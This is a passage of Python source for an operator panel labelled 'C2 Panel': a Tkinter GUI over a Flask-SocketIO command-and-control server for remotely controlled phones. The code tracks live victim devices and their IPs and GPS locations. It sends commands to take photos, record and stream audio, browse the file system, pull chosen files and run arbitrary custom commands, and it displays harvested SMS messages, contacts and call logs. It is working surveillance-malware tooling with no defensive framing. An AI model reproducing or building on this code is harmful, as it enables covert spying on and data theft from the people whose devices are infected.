        ttk.Label(server_info_frame, text="Live Connected Devices:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.connected_count_label = ttk.Label(server_info_frame, text="0")
        self.connected_count_label.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)

        actions_frame = ttk.LabelFrame(settings_content_frame, text="Actions")
        actions_frame.pack(pady=10, padx=5, fill=tk.X, expand=False)
        self.refresh_hist_btn = ttk.Button(actions_frame, text="Refresh Stored Devices List", command=self.refresh_historical_device_list)
        self.refresh_hist_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.refresh_live_btn = ttk.Button(actions_frame, text="Refresh Live Devices List", command=self.update_live_clients_list)
        self.refresh_live_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.clear_log_btn = ttk.Button(actions_frame, text="Clear System Log", command=self.clear_system_log)
        self.clear_log_btn.pack(side=tk.LEFT, padx=5, pady=5)

        self._enable_commands(False)
        self.refresh_historical_device_list()
        self.update_live_clients_list()
        self.add_system_log("C2 Panel GUI initialized.")

    def _enable_commands(self, enable=True):
        state = tk.NORMAL if enable else tk.DISABLED
        for btn_widget in self.command_buttons.values():
            btn_widget.config(state=state)
        
        # Specific handling for custom command and file browser buttons
        self.custom_cmd_btn.config(state=state)
        self.custom_cmd_entry.config(state="normal" if enable else "disabled")
        self.custom_args_entry.config(state="normal" if enable else "disabled")
        
        self.go_up_button.config(state=state if self.current_path_label.cget("text") != "/" else tk.DISABLED)
        # download_device_file_button is managed by on_file_browser_select

        if not enable:
            self.live_audio_status_var.set("Live Audio: Idle (No Device)")
            self.command_buttons.get("Open Live Audio Folder", ttk.Button(None)).config(state=tk.DISABLED) # Ensure open audio folder is disabled

        elif self.command_buttons.get("Open Live Audio Folder"): # If device selected, enable open audio folder
             self.command_buttons["Open Live Audio Folder"].config(state=tk.NORMAL)


    def add_system_log(self, message, error=False, debug=False):
        if not self.master.winfo_exists(): return
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"[{now}] {message}\n"
        self.log_text.config(state=tk.NORMAL)
        tag = None
        if error: tag = "error_log" # Use a different tag name to avoid conflict with Text widget's internal "error"
        elif debug: tag = "debug_log"
        
        if tag:
            self.log_text.tag_configure("error_log", foreground="red")
            self.log_text.tag_configure("debug_log", foreground="gray")
            self.log_text.insert(tk.END, formatted_message, tag)
        else:
            self.log_text.insert(tk.END, formatted_message)
            
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def clear_system_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.add_system_log("System log cleared by user.")

    def refresh_historical_device_list(self):
        if not self.master.winfo_exists(): return
        current_selection = self.current_selected_historical_device_id # Store current selection
        self.hist_device_listbox.delete(0, tk.END)
        new_selection_index = -1
        try:
            device_folders = [d for d in os.listdir(DATA_RECEIVED_DIR) if os.path.isdir(os.path.join(DATA_RECEIVED_DIR, d))]
            # Sort alphabetically for consistent order
            for idx, device_id in enumerate(sorted(device_folders)):
                tag_str = device_tags.get(device_id, "")
                display_name = f"{device_id} {'['+tag_str+']' if tag_str else ''}"
                self.hist_device_listbox.insert(tk.END, display_name)
                if device_id == current_selection:
                    new_selection_index = idx
            
            if new_selection_index != -1: # Re-select if it still exists
                self.hist_device_listbox.selection_set(new_selection_index)
                self.hist_device_listbox.see(new_selection_index) # Ensure it's visible

            self.add_system_log(f"Refreshed stored device list. Found {len(device_folders)} devices.")
        except Exception as e:
            self.add_system_log(f"Error refreshing stored device list: {e}", error=True)
            logger.error(f"Error refreshing stored device list: {e}", exc_info=True)
        
        if not self.hist_device_listbox.curselection(): # If nothing (or previous selection gone) is selected
            self.edit_tag_button.config(state=tk.DISABLED)


    def update_live_clients_list(self):
        if not self.master.winfo_exists(): return
        
        current_selection_sid = None
        if self.live_clients_tree.selection():
            current_selection_sid = self.live_clients_tree.selection()[0]

        # Clear existing items
        for item in self.live_clients_tree.get_children():
            try:
                self.live_clients_tree.delete(item)
            except tk.TclError: # Item might already be gone if updates are very fast
                pass 
        
        # Add current clients
        for sid, client_info in connected_clients_sio.items():
            dev_id = client_info.get("id", "N/A")
            tags = device_tags.get(dev_id, "")
            try: # Ensure item is inserted, handle rare race conditions if SID changes rapidly
                self.live_clients_tree.insert("", tk.END, iid=sid, values=(
                    dev_id,
                    client_info.get("name_display", "N/A"),
                    tags,
                    client_info.get("ip", "N/A"),
                    client_info.get("connected_at", "N/A"),
                    client_info.get("last_seen", "N/A"),
                    sid 
                ))
            except tk.TclError:
                logger.warning(f"Could not insert/update SID {sid} in live tree, may already exist or be invalid.")


        if current_selection_sid and self.live_clients_tree.exists(current_selection_sid):
            try:
                self.live_clients_tree.selection_set(current_selection_sid)
                self.live_clients_tree.focus(current_selection_sid)
            except tk.TclError:
                logger.warning(f"Could not re-select/focus SID {current_selection_sid} in live tree.")
        
        self.connected_count_label.config(text=str(len(connected_clients_sio)))

    def update_live_clients_list_item(self, sid):
        if not self.master.winfo_exists(): return
        if sid in connected_clients_sio and self.live_clients_tree.exists(sid):
            client_info = connected_clients_sio[sid]
            dev_id = client_info.get("id", "N/A")
            tags = device_tags.get(dev_id, "")
            try:
                self.live_clients_tree.item(sid, values=(
                    dev_id,
                    client_info.get("name_display", "N/A"),
                    tags,
                    client_info.get("ip", "N/A"),
                    client_info.get("connected_at", "N/A"),
                    client_info.get("last_seen", "N/A"),
                    sid
                ))
            except tk.TclError:
                 logger.warning(f"Could not update item {sid} in live tree.")
        self.connected_count_label.config(text=str(len(connected_clients_sio)))
        
    def on_historical_device_select(self, event=None):
        if not self.hist_device_listbox.curselection():
            self.current_selected_historical_device_id = None
            self.edit_tag_button.config(state=tk.DISABLED)
            self._enable_commands(False)
            return

        selected_index = self.hist_device_listbox.curselection()[0]
        selected_display_name = self.hist_device_listbox.get(selected_index)
        self.current_selected_historical_device_id = selected_display_name.split(" [")[0]
        
        self.display_device_details(self.current_selected_historical_device_id)
        self.edit_tag_button.config(state=tk.NORMAL)
        
        live_sid = next((s for s, i in connected_clients_sio.items() if i.get("id") == self.current_selected_historical_device_id), None)
        if live_sid:
            self.current_selected_live_client_sid = live_sid
            if not self.live_clients_tree.selection() or self.live_clients_tree.selection()[0] != live_sid:
                try:
                    self.live_clients_tree.selection_set(live_sid)
                    self.live_clients_tree.focus(live_sid)
                except tk.TclError:
                     logger.warning(f"Could not select SID {live_sid} in tree during historical select.")
            self._enable_commands(True)
            self.add_system_log(f"Selected stored device '{self.current_selected_historical_device_id}' is LIVE (SID: {live_sid}). Commands enabled.")
            self.send_list_files_for_path(self.current_path_label.cget("text") or "/") # Refresh file browser for live device
        else:
            self.current_selected_live_client_sid = None
            self._enable_commands(False)
            self.add_system_log(f"Selected stored device '{self.current_selected_historical_device_id}' is NOT live. Commands disabled.")
            # Clear file browser as device is not live
            for item in self.file_browser_tree.get_children(): self.file_browser_tree.delete(item)
            self.current_path_label.config(text="/")
            self.download_device_file_button.config(state=tk.DISABLED)
            self.go_up_button.config(state=tk.DISABLED)


    def on_live_client_select(self, event=None):
        selected_items = self.live_clients_tree.selection()
        if not selected_items:
            self.current_selected_live_client_sid = None
            # self.current_selected_historical_device_id = None # Don't clear historical just because live selection changed
            self._enable_commands(False)
            # self.hist_device_listbox.selection_clear(0, tk.END) # Don't clear historical selection
            # self.edit_tag_button.config(state=tk.DISABLED)
            return

        selected_item_iid = selected_items[0] # focus() might be better if selection returns multiple
        item_values = self.live_clients_tree.item(selected_item_iid, "values")
        
        if not item_values or len(item_values) < 7: # Ensure values are valid
            logger.warning(f"Invalid item values for selected live client: {item_values}")
            self._enable_commands(False)
            return

        self.current_selected_live_client_sid = item_values[6] # SID is the 7th value
        self.current_selected_historical_device_id = item_values[0] # Device ID is the 1st value

        self._enable_commands(True)
        self.add_system_log(f"Selected LIVE device '{self.current_selected_historical_device_id}' (SID: {self.current_selected_live_client_sid}). Commands enabled.")
        
        self.hist_device_listbox.selection_clear(0, tk.END)
        found_hist = False
        for i, item_text in enumerate(self.hist_device_listbox.get(0, tk.END)):
            if item_text.startswith(self.current_selected_historical_device_id):
                self.hist_device_listbox.selection_set(i)
                self.hist_device_listbox.see(i)
                self.edit_tag_button.config(state=tk.NORMAL)
                found_hist = True
                break
        if not found_hist:
            self.edit_tag_button.config(state=tk.DISABLED)


        self.display_device_details(self.current_selected_historical_device_id)
        self.current_path_label.config(text="/") # Reset path for new device selection
        self.send_list_files_for_path("/")


    def edit_selected_device_tag(self):
        if not self.current_selected_historical_device_id:
            messagebox.showwarning("Edit Tag", "No stored device selected.", parent=self.master)
            return
        
        current_tags = device_tags.get(self.current_selected_historical_device_id, "")
        new_tags = simpledialog.askstring("Edit Tags", f"Enter tags for {self.current_selected_historical_device_id} (comma-separated):",
                                          initialvalue=current_tags, parent=self.master)
        if new_tags is not None: 
            device_tags[self.current_selected_historical_device_id] = new_tags.strip()
            save_device_tags()
            self.refresh_historical_device_list() 
            live_sid = next((s for s, i in connected_clients_sio.items() if i.get("id") == self.current_selected_historical_device_id), None)
            if live_sid:
                self.update_live_clients_list_item(live_sid)

            self.add_system_log(f"Updated tags for '{self.current_selected_historical_device_id}' to '{new_tags}'.")


    def display_device_details(self, device_id_sanitized):
        self.device_info_text.config(state=tk.NORMAL)
        self.device_info_text.delete(1.0, tk.END)
        self.files_listbox.delete(0, tk.END)
        self.preview_text.config(state=tk.NORMAL)
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.config(state=tk.DISABLED)
        self.open_stored_file_button.config(state=tk.DISABLED)

        if not device_id_sanitized:
            self.device_info_text.insert(tk.END, "No device selected or device ID is invalid.\n")
            self.device_info_text.config(state=tk.DISABLED)
            return

        device_folder = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        if not os.path.isdir(device_folder):
            self.device_info_text.insert(tk.END, f"No data folder found for device: {device_id_sanitized}\n")
            self.device_info_text.config(state=tk.DISABLED)
            return

        info_files = sorted([f for f in os.listdir(device_folder) if f.startswith("info_") and f.endswith(".json")], reverse=True)
        if info_files:
            try:
                with open(os.path.join(device_folder, info_files[0]), "r", encoding="utf-8") as f:
                    info_data = json.load(f)
                
                dev_info_payload = info_data.get("deviceInfo", {})
                display_str = f"Device ID (from JSON): {info_data.get('deviceId', device_id_sanitized)}\n"
                display_str += f"Folder Name: {device_id_sanitized}\n"
                display_str += f"Display Name: {dev_info_payload.get('deviceName', 'N/A')}\n"
                display_str += f"Platform: {dev_info_payload.get('platform', 'N/A')}, OS Ver: {dev_info_payload.get('osVersion', 'N/A')}\n"
                display_str += f"Model: {dev_info_payload.get('model', 'N/A')}, Brand: {dev_info_payload.get('brand', 'N/A')}\n"
                
                location = info_data.get("location")
                if location and not location.get("error"):
                    lat, lon = location.get("latitude"), location.get("longitude")
                    if lat is not None and lon is not None:
                        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                        display_str += f"Location: Lat={lat}, Lon={lon} (Acc: {location.get('accuracy','N/A')}m)\n"
                        # display_str += f"  Google Maps: {maps_link}\n" # Link can be added
                self.device_info_text.insert(tk.END, display_str)
            except Exception as e:
                self.device_info_text.insert(tk.END, f"Error reading info file {info_files[0]}: {e}\n")
                logger.error(f"Error reading info file {info_files[0]} for {device_id_sanitized}: {e}", exc_info=True)
        else:
            self.device_info_text.insert(tk.END, f"No 'info_*.json' files found for {device_id_sanitized}.\n")
        
        self.device_info_text.config(state=tk.DISABLED)

        all_files = sorted([f for f in os.listdir(device_folder) if os.path.isfile(os.path.join(device_folder, f))])
        for filename in all_files:
            self.files_listbox.insert(tk.END, filename)
        if not all_files:
            self.files_listbox.insert(tk.END, "(No files stored for this device)")
            
    def on_file_select(self, event=None):
        if not self.files_listbox.curselection() or not self.current_selected_historical_device_id:
            self.open_stored_file_button.config(state=tk.DISABLED)
            self.preview_text.config(state=tk.NORMAL); self.preview_text.delete(1.0, tk.END); self.preview_text.config(state=tk.DISABLED)
            return

        selected_filename = self.files_listbox.get(self.files_listbox.curselection()[0])
        
        if selected_filename == "(No files stored for this device)":
            self.open_stored_file_button.config(state=tk.DISABLED)
            return
            
        self.open_stored_file_button.config(state=tk.NORMAL)
        file_path = os.path.join(DATA_RECEIVED_DIR, self.current_selected_historical_device_id, selected_filename)
        self.preview_text.config(state=tk.NORMAL); self.preview_text.delete(1.0, tk.END)
        
        try:
            if selected_filename.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp")):
                self.preview_text.insert(tk.END, f"Image file: {selected_filename}\nPath: {file_path}\n\n(Use 'Open/Preview' button to view image)")
            elif selected_filename.lower().endswith(".json"):
                with open(file_path, "r", encoding="utf-8") as f:
                    json_data = json.load(f)
                    pretty_json = json.dumps(json_data, indent=2, ensure_ascii=False) # ensure_ascii for Arabic
                    self.preview_text.insert(tk.END, pretty_json)
                    # Check if this JSON is one of the data types for the Data Viewer
                    if any(keyword in selected_filename.lower() for keyword in ["sms_list", "contacts_list", "call_logs_list"]):
                        self.load_data_into_viewer(json_data, selected_filename)
            elif selected_filename.lower().endswith((".txt", ".log", ".csv", ".md")):
                 with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(8192) # Preview more content
                    self.preview_text.insert(tk.END, content)
                    if len(content) == 8192 : self.preview_text.insert(tk.END, "\n\n... (file possibly truncated for preview)")
            else: 
                file_stat = os.stat(file_path)
                self.preview_text.insert(tk.END, f"File: {selected_filename}\nSize: {file_stat.st_size / 1024:.2f} KB\nModified: {datetime.datetime.fromtimestamp(file_stat.st_mtime)}\n\n(Binary or unrecognized file type - Open to view)")
        except Exception as e:
            self.preview_text.insert(tk.END, f"Error reading/previewing file {selected_filename}: {e}")
            logger.error(f"Error reading/previewing file {selected_filename}: {e}", exc_info=True)
        finally:
            self.preview_text.config(state=tk.DISABLED)

    def load_data_into_viewer(self, data_list_or_dict, filename):
        self.data_viewer_text.config(state=tk.NORMAL)
        self.data_viewer_text.delete(1.0, tk.END)
        
        self.data_viewer_text.insert(tk.END, f"--- Content of: {filename} ---\n\n")
        
        data_to_display = []
        if isinstance(data_list_or_dict, dict) and "files" in data_list_or_dict : # Handle list_files output directly
            data_to_display = data_list_or_dict["files"]
            self.data_viewer_text.insert(tk.END, f"Path: {data_list_or_dict.get('path', 'N/A')}\n")
        elif isinstance(data_list_or_dict, list):
            data_to_display = data_list_or_dict
        else: # Not a list or expected dict, just dump it
            self.data_viewer_text.insert(tk.END, json.dumps(data_list_or_dict, indent=2, ensure_ascii=False))
            self.data_viewer_text.config(state=tk.DISABLED)
            self.notebook.select(self.data_viewer_tab)
            return

        if not data_to_display:
            self.data_viewer_text.insert(tk.END, "(No items to display in this file)\n")
        elif "sms_list" in filename.lower():
            self.data_viewer_text.insert(tk.END, "SMS Messages:\n")
            for i, item in enumerate(data_to_display):
                self.data_viewer_text.insert(tk.END, f"  SMS #{i+1}:\n")
                self.data_viewer_text.insert(tk.END, f"    Address: {item.get('address', 'N/A')}\n")
                ts = item.get('date', 0)
                date_str = datetime.datetime.fromtimestamp(ts//1000).strftime('%Y-%m-%d %H:%M:%S') if isinstance(ts, int) and ts > 0 else 'N/A'
                self.data_viewer_text.insert(tk.END, f"    Date: {date_str}\n")
                self.data_viewer_text.insert(tk.END, f"    Type: {item.get('type', 'N/A')}\n")
                self.data_viewer_text.insert(tk.END, f"    Body: {item.get('body', 'N/A')}\n\n")
        elif "contacts_list" in filename.lower():
            self.data_viewer_text.insert(tk.END, "Contacts:\n")
            for i, item in enumerate(data_to_display):
                self.data_viewer_text.insert(tk.END, f"  Contact #{i+1}:\n")
                self.data_viewer_text.insert(tk.END, f"    Name: {item.get('name', 'N/A')}\n")
                self.data_viewer_text.insert(tk.END, f"    Number: {item.get('number', 'N/A')}\n\n")
        elif "call_logs_list" in filename.lower():
            self.data_viewer_text.insert(tk.END, "Call Logs:\n")
            for i, item in enumerate(data_to_display):
                self.data_viewer_text.insert(tk.END, f"  Call #{i+1}:\n")
                self.data_viewer_text.insert(tk.END, f"    Name: {item.get('name', 'N/A') if item.get('name') else '(No cached name)'}\n")
                self.data_viewer_text.insert(tk.END, f"    Number: {item.get('number', 'N/A')}\n")
                self.data_viewer_text.insert(tk.END, f"    Type: {item.get('type', 'N/A')}\n")
                ts = item.get('date', 0)
                date_str = datetime.datetime.fromtimestamp(ts//1000).strftime('%Y-%m-%d %H:%M:%S') if isinstance(ts, int) and ts > 0 else 'N/A'
                self.data_viewer_text.insert(tk.END, f"    Date: {date_str}\n")
                self.data_viewer_text.insert(tk.END, f"    Duration: {item.get('duration', 'N/A')}s\n\n")
        else: # Generic list of dicts or other JSON
            self.data_viewer_text.insert(tk.END, json.dumps(data_to_display, indent=2, ensure_ascii=False))
            
        self.data_viewer_text.config(state=tk.DISABLED)
        self.notebook.select(self.data_viewer_tab)
        self.add_system_log(f"Loaded content of '{filename}' into Data Viewer.")


    def open_selected_stored_file(self):
        if not self.files_listbox.curselection() or not self.current_selected_historical_device_id:
            messagebox.showwarning("Open File", "No file selected from the 'Stored Files' list.", parent=self.master)
            return
        selected_filename = self.files_listbox.get(self.files_listbox.curselection()[0])
        if selected_filename == "(No files stored for this device)": return

        file_path = os.path.join(DATA_RECEIVED_DIR, self.current_selected_historical_device_id, selected_filename)
        try:
            if not os.path.exists(file_path):
                messagebox.showerror("Error", f"File not found on server: {file_path}", parent=self.master)
                return

            if sys.platform == "win32":
                os.startfile(os.path.normpath(file_path))
            elif sys.platform == "darwin": # macOS
                subprocess.run(["open", file_path], check=True)
            else: # Linux and other UNIX-like
                subprocess.run(["xdg-open", file_path], check=True)
            self.add_system_log(f"Attempted to open stored file: {file_path}")
        except FileNotFoundError:
            messagebox.showerror("Error", f"File not found: {file_path}", parent=self.master)
        except Exception as e:
            self.add_system_log(f"Error opening file {file_path}: {e}", error=True)
            messagebox.showerror("Open File Error", f"Could not open file: {e}", parent=self.master)
            logger.error(f"Error opening file {file_path}: {e}", exc_info=True)

    def display_command_response(self, device_id, command_name, status, payload, command_id=None):
        if not self.master.winfo_exists(): return
        
        self.response_text.config(state=tk.NORMAL)
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{ts}] From {device_id} (Cmd: {command_name}, ID: {command_id or 'N/A'}, Status: {status}):\n"
        
        if isinstance(payload, dict):
            if command_name == SIO_CMD_LIST_FILES and "files" in payload and "path" in payload and status == "success":
                self.update_file_browser_tree(payload["path"], payload["files"])
                log_msg += f"  File listing for '{payload['path']}' received. Displayed in browser.\n"
            # Update live audio status from command responses
            elif command_name == SIO_CMD_START_LIVE_AUDIO and status == "success":
                self.live_audio_status_var.set("Live Audio: Streaming...")
                log_msg += f"  {payload.get('message', 'Live audio started.')}\n"
            elif command_name == SIO_CMD_STOP_LIVE_AUDIO:
                self.live_audio_status_var.set("Live Audio: Idle (Stopped)")
                log_msg += f"  {payload.get('message', 'Live audio stopped.')}\n"
            else: # Generic dict payload
                log_msg += json.dumps(payload, indent=2, ensure_ascii=False) + "\n"
        elif isinstance(payload, list): # If payload is a list (e.g. direct SMS data, though we now use files)
             log_msg += json.dumps(payload, indent=2, ensure_ascii=False) + "\n"
        elif payload: # Other non-dict, non-list payloads
            log_msg += str(payload) + "\n"
        else:
            log_msg += "  (No specific payload data)\n"
        
        self.response_text.insert(tk.END, log_msg + "\n")
        self.response_text.see(tk.END)
        self.response_text.config(state=tk.DISABLED)

        if device_id == self.current_selected_historical_device_id and \
           ( (isinstance(payload, dict) and "filename_on_server" in payload) or \
             (isinstance(payload, dict) and "_dump_file" in payload.get("message","").lower()) ):
            self.display_device_details(device_id)

    def on_file_browser_select(self, event=None):
        selected_item_id = self.file_browser_tree.focus()
        if not selected_item_id:
            self.download_device_file_button.config(state=tk.DISABLED)
            return
        
        item_values = self.file_browser_tree.item(selected_item_id, "values")
        item_type = item_values[0] if item_values and len(item_values) > 0 else ""
        if item_type.lower() == "file":
            self.download_device_file_button.config(state=tk.NORMAL)
        else:
            self.download_device_file_button.config(state=tk.DISABLED)
            
    def on_file_browser_double_click(self, event=None):
        selected_item_id = self.file_browser_tree.focus()
        if not selected_item_id: return

        item_values = self.file_browser_tree.item(selected_item_id, "values")
        item_type = item_values[0] if item_values and len(item_values) > 0 else ""
        item_path = item_values[4] if item_values and len(item_values) > 4 else "" 

        if item_type.lower() == "dir" and item_path:
            self.send_list_files_for_path(item_path)
        elif item_type.lower() == "file" and item_path:
            # Maybe show a confirm dialog before requesting download on double click?
            if messagebox.askyesno("Download File?", f"Request download of '{item_path}'?", parent=self.master):
                self.request_device_file_download()


    def file_browser_go_up(self):
        current_path = self.current_path_label.cget("text")
        if current_path == "/" or not current_path:
            return
        # More robust parent path calculation
        parent_path = os.path.normpath(os.path.join(current_path, ".."))
        if os.name == 'posix' and parent_path == ".": parent_path = "/" # Avoid '.' for root parent
        elif os.name == 'nt' and len(parent_path) == 2 and parent_path[1] == ':': # C:
             parent_path += "\\"


        self.send_list_files_for_path(parent_path if parent_path else "/")
        
    def request_device_file_download(self):
        if not self.current_selected_live_client_sid:
            messagebox.showwarning("Download File", "No live device selected.", parent=self.master)
            return

        selected_item_id = self.file_browser_tree.focus()
        if not selected_item_id:
            messagebox.showwarning("Download File", "No file selected in the browser.", parent=self.master)
            return
        
        item_values = self.file_browser_tree.item(selected_item_id, "values")
        item_type = item_values[0] if item_values and len(item_values) > 0 else ""
        item_path = item_values[4] if item_values and len(item_values) > 4 else ""

        if item_type.lower() != "file" or not item_path:
            messagebox.showwarning("Download File", "Selected item is not a file or path is missing.", parent=self.master)
            return
            
        self.add_system_log(f"Requesting download of '{item_path}' from device '{self.current_selected_historical_device_id}'.")
        send_command_to_client(self.current_selected_live_client_sid, SIO_CMD_UPLOAD_SPECIFIC_FILE, {"path": item_path})

    def update_file_browser_tree(self, path, files_list):
        for item in self.file_browser_tree.get_children():
            self.file_browser_tree.delete(item)
        # self.current_device_files_tree_items.clear() # Not used anymore if we rely on values in tree directly

        self.current_path_label.config(text=path)
        self.go_up_button.config(state=tk.NORMAL if path != "/" and path != "." else tk.DISABLED)

        if not files_list:
            self.file_browser_tree.insert("", tk.END, text="(Directory is empty or inaccessible)", open=True, values=("","","","",""))
            return

        for file_info in files_list:
            name = file_info.get("name", "Unknown")
            is_dir = file_info.get("isDirectory", False)
            size_bytes = file_info.get("size", 0)
            size_kb = f"{size_bytes / 1024:.1f}" if not is_dir and size_bytes > 0 else ("<DIR>" if is_dir else "0.0")
            last_modified_ms = file_info.get("lastModified", 0)
            last_modified_dt = datetime.datetime.fromtimestamp(last_modified_ms / 1000).strftime('%Y-%m-%d %H:%M') if last_modified_ms > 0 else "N/A"
            
            perms_list = []
            if file_info.get("canRead"): perms_list.append("r")
            if file_info.get("canWrite"): perms_list.append("w")
            perms_str = "".join(perms_list) if perms_list else "-"

            full_path = file_info.get("path", os.path.join(path, name) if path and path != "." else name)

            # Use full_path as iid for uniqueness if available, otherwise name + index
            item_iid = full_path if full_path else f"{name}_{datetime.datetime.now().microsecond}" 
            
            try:
                self.file_browser_tree.insert(
                    "", 
                    tk.END,
                    iid=item_iid, 
                    text=name,
                    values=(
                        "DIR" if is_dir else "File",
                        size_kb,
                        last_modified_dt,
                        perms_str,
                        full_path # Store full path in values for retrieval
                    ),
                    tags=('directory' if is_dir else 'file',)
                )
            except tk.TclError: # If IID somehow still conflicts (very rare)
                 self.file_browser_tree.insert(
                    "", 
                    tk.END,
                    iid=f"{item_iid}_{datetime.datetime.now().microsecond}", # Make it unique
                    text=name, values=("DIR" if is_dir else "File", size_kb, last_modified_dt, perms_str, full_path),
                    tags=('directory' if is_dir else 'file',)
                )
        
        self.file_browser_tree.tag_configure('directory', foreground='navy')
        self.file_browser_tree.tag_configure('file', foreground='black')
        self.download_device_file_button.config(state=tk.DISABLED) # Reset after listing


    # --- Command Sending Functions ---
    def send_simple_command(self, command_name):
        if self.current_selected_live_client_sid:
            send_command_to_client(self.current_selected_live_client_sid, command_name)
        else:
            messagebox.showwarning("Command Error", "No live device selected.", parent=self.master)

    def send_get_device_info_stub(self):
        self.add_system_log("Get Device Info (N/A): Device info is typically sent upon connection.", debug=True)
        messagebox.showinfo("Get Device Info", "Device information is sent automatically on connection. This is a placeholder.", parent=self.master)

    def send_list_files_for_path(self, path_to_list):
        if self.current_selected_live_client_sid:
            self.add_system_log(f"Requesting file list for path: '{path_to_list}' from device.")
            send_command_to_client(self.current_selected_live_client_sid, SIO_CMD_LIST_FILES, {"path": path_to_list})
        else:
            messagebox.showwarning("Command Error", "No live device selected for List Files.", parent=self.master)
            
    def send_list_files_prompt(self): 
        if not self.current_selected_live_client_sid:
            messagebox.showwarning("Command Error", "No live device selected.", parent=self.master)
            return
        path = simpledialog.askstring("List Files", "Enter path to list (e.g., /sdcard/ or .):", initialvalue=self.current_path_label.cget("text"), parent=self.master)
        if path is not None: 
            self.send_list_files_for_path(path.strip())

    def send_get_location(self):
        self.send_simple_command(SIO_CMD_GET_LOCATION)

    def send_take_picture(self):
        self.send_simple_command(SIO_CMD_TAKE_PICTURE) 

    def send_upload_specific_file_prompt(self):
        if not self.current_selected_live_client_sid:
            messagebox.showwarning("Command Error", "No live device selected.", parent=self.master)
            return
        path = simpledialog.askstring("Upload Specific File", "Enter full path of file on device to upload:", parent=self.master)
        if path and path.strip(): 
            send_command_to_client(self.current_selected_live_client_sid, SIO_CMD_UPLOAD_SPECIFIC_FILE, {"path": path.strip()})

    def send_record_audio_fixed(self, duration_seconds=10):
        if self.current_selected_live_client_sid:
            duration = simpledialog.askinteger("Record Audio", "Enter duration in seconds:", initialvalue=duration_seconds, minvalue=1, maxvalue=300, parent=self.master)
            if duration is not None:
                send_command_to_client(self.current_selected_live_client_sid, SIO_CMD_RECORD_AUDIO_FIXED, {"duration_seconds": duration})
        else:
            messagebox.showwarning("Command Error", "No live device selected.", parent=self.master)

    def send_start_live_audio(self):
        self.send_simple_command(SIO_CMD_START_LIVE_AUDIO)
        self.live_audio_status_var.set("Live Audio: Starting...")
            
    def send_stop_live_audio(self):
        self.send_simple_command(SIO_CMD_STOP_LIVE_AUDIO)
        self.live_audio_status_var.set("Live Audio: Stopping...")

    def open_live_audio_folder_for_device(self):
        if not self.current_selected_historical_device_id: # Use historical ID for folder consistency
            messagebox.showwarning("Open Folder", "No device selected.", parent=self.master)
            return
        
        device_id_sanitized = "".join(c if c.isalnum() or c in ["_", "-"] else "_" for c in self.current_selected_historical_device_id)
        device_audio_path = os.path.join(LIVE_AUDIO_DIR, device_id_sanitized)
        
        if not os.path.exists(device_audio_path):
            os.makedirs(device_audio_path, exist_ok=True) # Create if it doesn't exist yet
            messagebox.showinfo("Open Folder", f"Live audio folder for '{device_id_sanitized}' created (was empty).\nPath: {device_audio_path}", parent=self.master)
            
        try:
            if sys.platform == "win32":
                os.startfile(os.path.normpath(device_audio_path))
            elif sys.platform == "darwin":
                subprocess.run(["open", device_audio_path], check=True)
            else:
                subprocess.run(["xdg-open", device_audio_path], check=True)
            self.add_system_log(f"Attempted to open live audio folder: {device_audio_path}")
        except Exception as e:
            self.add_system_log(f"Error opening live audio folder {device_audio_path}: {e}", error=True)
            messagebox.showerror("Open Folder Error", f"Could not open folder: {e}", parent=self.master)

    def send_custom_command(self):
        if not self.current_selected_live_client_sid:
            messagebox.showwarning("Command Error", "No live device selected.", parent=self.master)
            return
        cmd_name = self.custom_cmd_entry.get().strip()
        args_str = self.custom_args_entry.get().strip()
        if not cmd_name:
            messagebox.showwarning("Custom Command", "Command Name cannot be empty.", parent=self.master)
            return
        try:
            args_json = json.loads(args_str) if args_str else {}
            if not isinstance(args_json, dict):
                raise ValueError("Arguments must be a valid JSON object.")
        except json.JSONDecodeError:
            messagebox.showerror("Custom Command Error", "Invalid JSON in arguments.", parent=self.master)
            return
        except ValueError as ve: 
            messagebox.showerror("Custom Command Error", str(ve), parent=self.master)
            return
            
        send_command_to_client(self.current_selected_live_client_sid, cmd_name, args_json)


# --- Main Function ---
def main():
    global gui_app
    load_device_tags()

    def run_flask():
        logger.info("Starting Flask-SocketIO server on 0.0.0.0:5000")
        try:
            # Set log_output=True for Flask's default logging if needed, but our logger is separate
            socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False, allow_unsafe_werkzeug=True)
        except OSError as e_os:
            logger.critical(f"COULD NOT START FLASK SERVER (OS Error): {e_os}", exc_info=True)
            errmsg = f"Port 5000 is already in use. Please close the other application using it." if "address already in use" in str(e_os).lower() else f"Could not start C2 server on port 5000: {e_os}"
            if gui_app and gui_app.master.winfo_exists():
                gui_app.master.after(100, lambda: messagebox.showerror("FATAL SERVER ERROR", f"{errmsg}\n\nThe panel will exit."))
                gui_app.master.after(500, gui_app.master.destroy)
            else:
                print(f"FATAL SERVER ERROR: {errmsg}. Exiting.")
                os._exit(1) # Force exit if GUI not up
        except Exception as e:
            logger.critical(f"COULD NOT START FLASK SERVER (General Error): {e}", exc_info=True)
            if gui_app and gui_app.master.winfo_exists():
                gui_app.master.after(100, lambda: messagebox.showerror("FATAL SERVER ERROR", f"Could not start C2 server: {e}\n\nThe panel will exit."))
                gui_app.master.after(500, gui_app.master.destroy)
            else:
                print(f"FATAL SERVER ERROR: Could not start C2 server: {e}. Exiting.")
                os._exit(1) # Force exit

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    root = tk.Tk()
    gui_app = C2PanelGUI(root)
    try:
        logger.info("C2 Panel GUI started. Server in background thread.")
        gui_app.add_system_log("Flask server thread started. Panel is ready.")
    except Exception as e: # Catch potential errors during GUI init itself
        logger.error(f"Error during GUI startup phase: {e}", exc_info=True)
        if gui_app and gui_app.master.winfo_exists(): # Check if master exists
